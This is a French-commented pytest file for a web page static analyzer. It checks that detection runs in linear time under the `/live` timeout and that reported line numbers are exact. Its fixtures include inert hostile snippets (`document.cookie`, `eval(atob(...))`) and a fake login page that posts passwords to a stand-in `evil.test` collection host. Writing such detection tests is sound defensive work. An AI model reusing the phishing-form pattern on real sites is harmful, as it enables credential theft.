# SPDX-FileCopyrightText: 2026 GuatX
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Coût de `analyze_html` mesuré sur un DOM HOSTILE, pas sur un échantillon bénin.

Le banc de 17a2fb6 mesurait un DOM sans détection : il annonçait 590 ms/Mio et
3,0 s à 5 Mio. Or la facture n'est pas fixée par la TAILLE du document mais par
le NOMBRE de matches, parce que le numéro de ligne était recalculé depuis le
début pour CHAQUE match (`html.count("\\n", 0, m.start())`, O(n) par match, donc
quadratique). Mesuré sur 57f9d6a avec un DOM de `document.cookie;` répété :

    512 Kio ->   3 920 ms      1 Mio -> 12 264 ms      2 Mio -> 66 739 ms

soit un écart ×110 à 2 Mio par rapport au chiffre annoncé, et ~9 minutes
extrapolées pour UNE analyse au plafond `OCULAR_MAX_HTML_BYTES` (5 000 000).

Conséquence opérationnelle, et c'est elle qui compte : `internal_get_json` a un
timeout de 5,0 s. Dès ~600 Kio de contenu hostile, chaque poll `/live` rend donc
502 — et le chemin de compensation `registry.mark_connected()`/`touch()`
(web/app.py, correctif M1) n'était JAMAIS atteint puisqu'il se trouve APRÈS le
`except`. Après une micro-coupure du WS VNC, le reaper détruisait alors une
session SAINE : exactement le symptôme S8 que 17a2fb6 déclarait fermé, atteint
par le timeout de `/live` au lieu du gel de `/health`.
"""
import time

import pytest

from engine.static import analyze_html

# Les `eval(atob(...))` et `document.cookie` de ce fichier sont des chaînes
# d'octets INERTES (faux DOM capturé), jamais exécutées : elles ne servent qu'à
# faire mordre un motif d'`engine.static`. Même convention que
# tests/test_session_server_live_cpu.py et tests/test_session_server_logic.py.

# Timeout réel de `web.internal_http.internal_get_json`. Le seuil du test n'est
# pas un chiffre arbitraire : au-delà, `/live` rend 502 en production.
LIVE_TIMEOUT_S = 5.0


def _hostile(kib: int) -> str:
    """DOM ADVERSE : beaucoup de matches, pas un gros texte bénin. Chaque
    `document.cookie;` déclenche une détection d'`engine.static`."""
    return "document.cookie;" * ((kib * 1024) // 16)


def test_hostile_dom_analysis_fits_in_the_live_timeout():
    """1 Mio de contenu hostile : 12 264 ms mesurés avant, pour un budget de 5 s."""
    dom = _hostile(1024)
    start = time.perf_counter()
    findings = analyze_html(dom)
    elapsed = time.perf_counter() - start
    assert findings, "le DOM de test doit produire des détections, sinon il n'est pas hostile"
    assert elapsed < LIVE_TIMEOUT_S, (
        f"analyse de 1 Mio hostile en {elapsed * 1000:.0f} ms : au-delà de "
        f"{LIVE_TIMEOUT_S} s chaque poll /live rend 502"
    )


def test_analysis_cost_is_linear_not_quadratic():
    """Mesure de la FORME du coût, indépendante de la vitesse machine : en
    quadruplant la taille, un coût quadratique est multiplié par ~16, un coût
    linéaire par ~4. Mesuré avant : 3 920 ms -> 66 739 ms de 512 Kio à 2 Mio,
    soit ×17,0 pour ×4 de taille."""
    small, large = _hostile(256), _hostile(1024)

    start = time.perf_counter()
    analyze_html(small)
    t_small = time.perf_counter() - start

    start = time.perf_counter()
    analyze_html(large)
    t_large = time.perf_counter() - start

    ratio = t_large / max(t_small, 1e-6)
    assert ratio < 8.0, (
        f"×{ratio:.1f} de coût pour ×4 de taille : le coût reste quadratique "
        f"({t_small * 1000:.0f} ms -> {t_large * 1000:.0f} ms)"
    )


@pytest.mark.parametrize("html,expected", [
    ("eval(atob('x'))", [1]),
    ("\n\neval(atob('x'))", [3]),
    ("eval(atob('a'))\n\n\neval(atob('b'))", [1, 4]),
    ("\n".join(["ligne"] * 50) + "\neval(atob('x'))", [51]),
])
def test_line_numbers_are_exact(html, expected):
    """Non-régression du CONTENU : le calcul incrémental doit rendre exactement
    les mêmes numéros de ligne que le recomptage depuis zéro."""
    lines = [f.line for f in analyze_html(html) if f.rule]
    assert lines[:len(expected)] == expected


def test_line_numbers_match_a_naive_recount_on_a_real_looking_page():
    """Oracle : le calcul naïf (celui d'avant, `count` depuis 0) sur un document
    multiligne réaliste, comparé au calcul incrémental."""
    page = "\n".join([
        "<html><head><title>Connexion</title></head>",
        "<body>",
        "  <script>eval(atob('ZG9j'))</script>",
        "  <form action='https://collect.evil.test/h' method='POST'>",
        "    <input type='password' name='pass'>",
        "  </form>",
        "  <script>document.cookie;</script>",
        "  <a href='mailto:drop@evil.test'>contact</a>",
        "</body></html>",
    ])
    for finding in analyze_html(page):
        naive = page.count("\n", 0, page.index(finding.match)) + 1
        assert finding.line == naive, (
            f"ligne {finding.line} pour {finding.match!r}, recomptage naïf : {naive}"
        )
